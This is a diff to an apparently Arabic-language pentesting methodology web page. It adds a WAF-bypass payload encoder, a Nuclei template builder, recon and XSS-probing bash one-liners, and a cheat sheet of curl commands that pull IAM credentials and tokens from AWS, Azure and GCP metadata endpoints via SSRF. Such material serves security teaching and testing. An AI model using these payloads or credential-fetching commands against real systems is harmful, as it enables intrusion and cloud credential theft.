@@ -629,7 +629,19 @@
             <span>├── 🔍</span> <span>Source Code Review (SAST)</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'code_review', '🔍 Source Code Review (SAST)')">★</button>
           </div>
           <div class="meth-item" id="meth-ef-target_mindmap" onclick="openMethPhase('target_mindmap')" data-search="target mindmap attack surface visualizer flow attack tree generator">
-            <span>└── 🗺️</span> <span>Target Attack Mindmap</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'target_mindmap', '🗺️ Target Attack Mindmap')">★</button>
+            <span>├── 🗺️</span> <span>Target Attack Mindmap</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'target_mindmap', '🗺️ Target Attack Mindmap')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-payload_mutator" onclick="openMethPhase('payload_mutator')" data-search="payload mutator encoder url double url unicode hex html string charcode waf bypass">
+            <span>├── 🔮</span> <span>Payload Mutator & Encoder</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'payload_mutator', '🔮 Payload Mutator & Encoder')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-nuclei_builder" onclick="openMethPhase('nuclei_builder')" data-search="nuclei custom template builder generator yaml template creator vuln Scanner">
+            <span>├── ⚙️</span> <span>Nuclei Template Generator</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'nuclei_builder', '⚙️ Nuclei Template Generator')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-oneliners_matrix" onclick="openMethPhase('oneliners_matrix')" data-search="instant bash oneliners matrix command line cheatsheet pipelining">
+            <span>├── ⚡</span> <span>Instant Bash One-Liners</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'oneliners_matrix', '⚡ Instant Bash One-Liners')">★</button>
+          </div>
+          <div class="meth-item" id="meth-ef-cloud_metadata" onclick="openMethPhase('cloud_metadata')" data-search="cloud metadata imds imdsv2 aws azure gcp ssrf credentials token">
+            <span>└── ☁️</span> <span>Cloud Metadata & IMDSv2</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'cloud_metadata', '☁️ Cloud Metadata & IMDSv2')">★</button>
           </div>
         </div>
       </div>
@@ -9166,7 +9178,8 @@ SMUGGLLED
           </div>
 
           <h4 style="color:#ef4444; margin-top:20px;">3. HTTP/2 Downgrade Smuggling (H2.CL & H2.TE)</h4>
-          <p>عندما يستقبل الـ Front-end ترافيك بـ HTTP/2 ثم يقليله إلى HTTP/1.1 أثناء الإرسال للـ Back-end، يمكن حقن ترويسات CRLF <code>
+          <p>عندما يستقبل الـ Front-end ترافيك بـ HTTP/2 ثم يقليله إلى HTTP/1.1 أثناء الإرسال للـ Back-end، يمكن حقن ترويسات CRLF <code>
+
 </code> داخل أسماء وقيم ترويسات الـ HTTP/2!</p>
         </div>
       </div>
@@ -9364,6 +9377,190 @@ SMUGGLLED
               <div style="font-size:1.1rem; font-weight:bold; color:#00ff66; margin-bottom:10px;" id="mmap-title"></div>
               <div id="mmap-tree-flow" style="display:flex; flex-direction:column; gap:10px;"></div>
             </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE 13: Payload Mutator & Encoder (WAF Bypass Suite)
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-payload_mutator" style="display: none; --tool-color: #00e5ff;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">🔮</span> Payload Mutator & Encoder Suite</h2>
+          <p class="hero-tagline">تحويل وتشفير الـ Payloads لـ +8 صيغ مختلفة تلقائياً لتجاوز فلاتر الـ WAF وحواجز الحظر</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-info">ℹ️ Utility Tool</span>
+            <span class="badge badge-tool">🔧 URL · Double URL · Base64 · Hex · HTML Entity · Unicode · JS CharCode</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>⚡ Instant Multi-Format Payload Generator</h3></div>
+          <div style="background:rgba(0,229,255,0.05); padding:15px; border-radius:8px; border:1px solid rgba(0,229,255,0.2);">
+            <label style="display:block; color:#00e5ff; font-weight:bold; margin-bottom:5px;">Input Raw Payload:</label>
+            <textarea id="pm-raw-input" oninput="mutatePayload()" style="width:100%; height:70px; padding:10px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px; font-family:monospace; margin-bottom:15px;" placeholder="<script>alert(1)</script>"></textarea>
+            
+            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap:12px;" id="pm-out-grid">
+              <!-- Grid items created dynamically by JS -->
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE 14: Nuclei Custom Template Generator
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-nuclei_builder" style="display: none; --tool-color: #00ff66;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">⚙️</span> Nuclei Custom Template Generator</h2>
+          <p class="hero-tagline">إنشاء قوالب YAML مخصصة لأداة Nuclei بضغطة زر وتنزيلها مباشرة</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-info">ℹ️ Template Builder</span>
+            <span class="badge badge-tool">🔧 Nuclei v3 YAML Generator</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🛠️ Custom YAML Generator</h3></div>
+          <div style="background:rgba(0,255,102,0.05); padding:15px; border-radius:8px; border:1px solid rgba(0,255,102,0.2);">
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:10px;">
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Template ID:</label>
+                <input type="text" id="nuc-id" value="custom-cve-check" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+              </div>
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Severity:</label>
+                <select id="nuc-sev" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+                  <option value="critical">Critical</option>
+                  <option value="high">High</option>
+                  <option value="medium">Medium</option>
+                  <option value="low">Low</option>
+                  <option value="info">Info</option>
+                </select>
+              </div>
+            </div>
+            
+            <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px; margin-bottom:10px;">
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Request Path:</label>
+                <input type="text" id="nuc-path" value="/api/v1/debug" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+              </div>
+              <div>
+                <label style="display:block; color:#00ff66; font-size:0.85rem; font-weight:bold;">Match Word / String:</label>
+                <input type="text" id="nuc-match" value="root:x:0:0" style="width:100%; padding:6px; background:#0b1120; color:#fff; border:1px solid #334155; border-radius:4px;">
+              </div>
+            </div>
+            
+            <button class="cmd-btn" onclick="generateNucleiYaml()" style="background:#00ff66; color:#000; border:none; padding:8px 16px; border-radius:4px; font-weight:bold; cursor:pointer; margin-bottom:15px;">⚡ Build YAML Template</button>
+            
+            <textarea id="nuc-yaml-out" style="width:100%; height:200px; background:#040914; color:#e2e8f0; font-family:monospace; padding:10px; border:1px solid #00ff66; border-radius:4px;"></textarea>
+            <button onclick="copyNucleiYaml()" style="margin-top:8px; background:var(--accent-cyan); color:#000; border:none; padding:6px 14px; border-radius:4px; font-weight:bold; cursor:pointer;">📋 Copy YAML</button>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE 15: Instant Bash One-Liners Matrix
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-oneliners_matrix" style="display: none; --tool-color: #f97316;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">⚡</span> Instant Bash One-Liners Arsenal</h2>
+          <p class="hero-tagline">أقوى أوامر الـ Bash والـ Pipelining الجاهزة للنسخ الفوري لتسريع الفحص والصيد</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-info">ℹ️ One-Liners Arsenal</span>
+            <span class="badge badge-tool">🔧 Subfinder · Katana · Httpx · GF · Nuclei</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>📋 مصفوفة الأوامر السريعة مع زر النسخ الفوري</h3></div>
+          
+          <div style="display:flex; flex-direction:column; gap:12px;">
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #00e5ff;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="color:#00e5ff; font-weight:bold;">1. Full Subdomain Enum & Alive Filter Pipeline:</span>
+                <button onclick="copyOneLiner(this)" data-cmd="subfinder -d target.com -all -silent | httpx -silent -sc -title -td -o alive_subs.txt" style="background:#00e5ff; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.85rem;">subfinder -d target.com -all -silent | httpx -silent -sc -title -td -o alive_subs.txt</code>
+            </div>
+
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #00ff66;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="color:#00ff66; font-weight:bold;">2. Extract JS Files & Secrets Hunter:</span>
+                <button onclick="copyOneLiner(this)" data-cmd="katana -u alive_subs.txt -jc -silent | grep '\.js$' | httpx -sr -srd js_out" style="background:#00ff66; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.85rem;">katana -u alive_subs.txt -jc -silent | grep '\.js$' | httpx -sr -srd js_out</code>
+            </div>
+
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #f97316;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="color:#f97316; font-weight:bold;">3. Fetch Wayback URLs & Filter for Potential XSS:</span>
+                <button onclick="copyOneLiner(this)" data-cmd="waybackurls target.com | gf xss | grep '=' | qsreplace '&quot;&gt;&lt;script&gt;confirm(1)&lt;/script&gt;' | dalfox pipe" style="background:#f97316; color:#000; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.85rem;">waybackurls target.com | gf xss | grep '=' | qsreplace '"&gt;&lt;script&gt;confirm(1)&lt;/script&gt;' | dalfox pipe</code>
+            </div>
+
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #a855f7;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="color:#a855f7; font-weight:bold;">4. Extract Hidden Parameters with Arjun:</span>
+                <button onclick="copyOneLiner(this)" data-cmd="arjun -u https://target.com/endpoint -m GET,POST --passive -oJ params.json" style="background:#a855f7; color:#fff; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.85rem;">arjun -u https://target.com/endpoint -m GET,POST --passive -oJ params.json</code>
+            </div>
+
+            <div style="background:#090d16; padding:12px; border-radius:6px; border-left:3px solid #ef4444;">
+              <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:5px;">
+                <span style="color:#ef4444; font-weight:bold;">5. Fast Port Scanning with Naabu & Nmap Version Fingerprinting:</span>
+                <button onclick="copyOneLiner(this)" data-cmd="naabu -host target.com -top-ports 1000 -silent | nmap -sV -sC -iL - -p-" style="background:#ef4444; color:#fff; border:none; padding:3px 8px; border-radius:3px; font-weight:bold; cursor:pointer; font-size:0.75rem;">Copy</button>
+              </div>
+              <code style="color:#e2e8f0; font-family:monospace; font-size:0.85rem;">naabu -host target.com -top-ports 1000 -silent | nmap -sV -sC -iL - -p-</code>
+            </div>
+          </div>
+        </div>
+      </div>
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODULE 16: Cloud Metadata & IMDSv2 Cheatsheet
+      ═══════════════════════════════════════════════════════════ -->
+      <div class="meth-content-view" id="meth-content-cloud_metadata" style="display: none; --tool-color: #a855f7;">
+        <div class="cyber-hero">
+          <h2 class="hero-title"><span class="hero-icon">☁️</span> Cloud Metadata & IMDSv2 Exploitation</h2>
+          <p class="hero-tagline">دليل سحب التوكنات ومفاتيح الـ IAM من بيئات AWS و Azure و GCP عبر ثغرات الـ SSRF</p>
+          <div style="margin-top: 15px; display: flex; gap: 10px; flex-wrap: wrap;">
+            <span class="badge badge-high">🔴 Critical Impact</span>
+            <span class="badge badge-tool">🔧 AWS IMDSv1/v2 · Azure Metadata · GCP Metadata</span>
+          </div>
+        </div>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>☁️ Cloud Provider Metadata Endpoints Matrix</h3></div>
+          
+          <h4 style="color:#a855f7;">1. AWS EC2 Metadata (IMDSv1 & IMDSv2 Bypass)</h4>
+          <div class="cmd-block">
+            <div class="cmd-header"><span class="cmd-lang">AWS IMDS Commands</span></div>
+            <pre><code># AWS IMDSv1 (Direct GET request)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# AWS IMDSv2 (Requires Session Token Header)
+TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/role_name</code></pre>
+          </div>
+
+          <h4 style="color:#a855f7; margin-top:20px;">2. Azure Virtual Machine Metadata</h4>
+          <div class="cmd-block">
+            <div class="cmd-header"><span class="cmd-lang">Azure Metadata Command (Requires Metadata: true Header)</span></div>
+            <pre><code>curl -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"</code></pre>
+          </div>
+
+          <h4 style="color:#a855f7; margin-top:20px;">3. Google Cloud Platform (GCP) Metadata</h4>
+          <div class="cmd-block">
+            <div class="cmd-header"><span class="cmd-lang">GCP Metadata Command (Requires Metadata-Flavor: Google Header)</span></div>
+            <pre><code>curl -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"</code></pre>
           </div>
         </div>
       </div>
@@ -9594,6 +9791,105 @@ function generateTargetMindmap() {
   
   flow.innerHTML = html;
   box.style.display = 'block';
+}
+</script>
+
+
+<script>
+// ════ Payload Mutator Logic ════
+function mutatePayload() {
+  const raw = document.getElementById('pm-raw-input').value || '<script>alert(1)</script>';
+  const grid = document.getElementById('pm-out-grid');
+  
+  const encURL = encodeURIComponent(raw);
+  const encDoubleURL = encodeURIComponent(encodeURIComponent(raw));
+  const encB64 = btoa(raw);
+  const encHex = Array.from(raw).map(c => '%' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+  const encHtmlHex = Array.from(raw).map(c => '&#x' + c.charCodeAt(0).toString(16) + ';').join('');
+  const encUnicode = Array.from(raw).map(c => '\u' + c.charCodeAt(0).toString(16).padStart(4, '0')).join('');
+  const encCharCode = 'String.fromCharCode(' + Array.from(raw).map(c => c.charCodeAt(0)).join(',') + ')';
+  const encSVG = `<svg onload="${raw}">`;
+
+  const formats = [
+    { title: 'Standard URL Encoded', val: encURL },
+    { title: 'Double URL Encoded', val: encDoubleURL },
+    { title: 'Base64 Encoded', val: encB64 },
+    { title: 'Hex Encoded', val: encHex },
+    { title: 'HTML Entity Hex', val: encHtmlHex },
+    { title: 'Unicode Encoded', val: encUnicode },
+    { title: 'JS String.fromCharCode', val: encCharCode },
+    { title: 'SVG Onload Wrapper', val: encSVG }
+  ];
+
+  let html = '';
+  formats.forEach(f => {
+    html += `
+      <div style="background:#040914; padding:10px; border-radius:6px; border:1px solid rgba(0,229,255,0.15);">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
+          <span style="color:#00e5ff; font-weight:bold; font-size:0.8rem;">${f.title}</span>
+          <button onclick="copyPmVal(this)" data-val="${f.val.replace(/"/g, '&quot;')}" style="background:var(--accent-cyan); color:#000; border:none; padding:2px 6px; border-radius:3px; font-weight:bold; font-size:0.7rem; cursor:pointer;">Copy</button>
+        </div>
+        <textarea readonly style="width:100%; height:45px; background:#090d16; color:#e2e8f0; font-family:monospace; border:none; border-radius:3px; padding:4px; font-size:0.75rem; resize:none;">${f.val}</textarea>
+      </div>
+    `;
+  });
+  grid.innerHTML = html;
+}
+document.addEventListener('DOMContentLoaded', () => { setTimeout(mutatePayload, 600); });
+
+function copyPmVal(btn) {
+  const val = btn.getAttribute('data-val');
+  navigator.clipboard.writeText(val);
+  alert('Copied to Clipboard!');
+}
+
+// ════ Nuclei Template Generator Logic ════
+function generateNucleiYaml() {
+  const id = document.getElementById('nuc-id').value || 'custom-cve-check';
+  const sev = document.getElementById('nuc-sev').value;
+  const path = document.getElementById('nuc-path').value || '/api/v1/debug';
+  const match = document.getElementById('nuc-match').value || 'root:x:0:0';
+
+  const yaml = `id: ${id}
+
+info:
+  name: Custom Security Check for ${id}
+  author: abdo-cyber-academy
+  severity: ${sev}
+  tags: custom,exposure,vulnerability
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}${path}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "${match}"
+        part: body
+
+      - type: status
+        status:
+          - 200`;
+
+  document.getElementById('nuc-yaml-out').value = yaml;
+}
+document.addEventListener('DOMContentLoaded', () => { setTimeout(generateNucleiYaml, 600); });
+
+function copyNucleiYaml() {
+  const txt = document.getElementById('nuc-yaml-out');
+  txt.select();
+  document.execCommand('copy');
+  alert('Nuclei YAML Copied!');
+}
+
+// ════ One-Liner Copy Helper ════
+function copyOneLiner(btn) {
+  const cmd = btn.getAttribute('data-cmd');
+  navigator.clipboard.writeText(cmd);
+  alert('One-Liner Copied to Clipboard!');
 }
 </script>
 
